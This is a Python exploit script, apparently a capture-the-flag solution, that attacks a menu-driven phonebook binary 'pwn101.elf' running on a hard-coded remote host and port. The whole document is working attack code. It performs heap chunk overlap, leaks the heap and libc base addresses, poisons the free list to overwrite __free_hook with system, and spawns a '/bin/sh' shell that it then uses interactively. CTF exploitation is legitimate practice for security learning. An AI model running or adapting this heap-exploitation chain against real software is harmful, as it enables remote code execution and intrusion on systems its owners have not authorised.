#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './pwn101.elf'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'82.196.10.106', 'port':29099})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    pwn = Pwn(conn)

    pwn.add(0x30, 0, 'A'*0x10, 'a'*8)
    pwn.add(0x30, 1, 'B'*0x10, 'b'*8)
    pwn.add(0x500, 2, 'C'*0x10, 'c'*8)
    pwn.delete(0)

    pwn.add(0x38, 0, 'D'*0x10, 'd'*0x38+'\x71')
    pwn.delete(0)
    pwn.delete(1)

    idx = pwn.add(0x60, 0, 'E'*0x10, 'e'*0x30)
    addr_heap_base = u(pwn.show(idx)['desc'][0x30:]) - 0x12a0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
    pwn.delete(idx)

    idx_a = pwn.add(0x60, 0, 'F'*0x10, 'f'*0x28+p64(0x591))
    idx_b = pwn.add(0x30, 1, 'G'*0x8+p64(0x21), 'g'*8)
    pwn.delete(idx_b)
    pwn.delete(idx_a)

    idx = pwn.add(0x60, 0, 'H'*0x10, 'h'*0x30)
    addr_libc_mainarena = u(pwn.show(idx)['desc'][0x30:]) - 0x60
    pwn.delete(idx)
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    pwn.add(0x60, 0, 'I'*0x10, 'i'*0x28+p64(0x581))
    pwn.delete(2)
    pwn.delete(0)

    pwn.add(0x570, 0, 'J'*0x10, 'j'*0x38+p64(0x31)+p64(addr_libc_free_hook))
    idx = pwn.add(0x20, 1, '/bin/sh\x00', p64(addr_libc_system))
    pwn.delete(idx)
    
class Pwn:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, length, phone, name, desc):
        self.sendlineafter('> ', '1')
        self.sendlineafter('Length: ', str(length))
        self.sendlineafter('Number: ', str(phone))
        self.sendafter('Name: ', name)
        self.sendafter('Description: ', desc)
        self.recvuntil('index=')
        return int(self.recvuntil('\n', drop=True))

    def show(self, idx):
        self.sendlineafter('> ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.recvuntil(': ')
        phone = int(self.recvuntil('\nName', drop=True))
        self.recvuntil(': ')
        name = self.recvuntil('\nDesc', drop=True)
        self.recvuntil(': ')
        desc = self.recvuntil('\n++++', drop=True)
        return {'phone':phone, 'name':name, 'desc':desc}

    def delete(self, idx):
        self.sendlineafter('> ', '3')
        self.sendlineafter('Index: ', str(idx))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
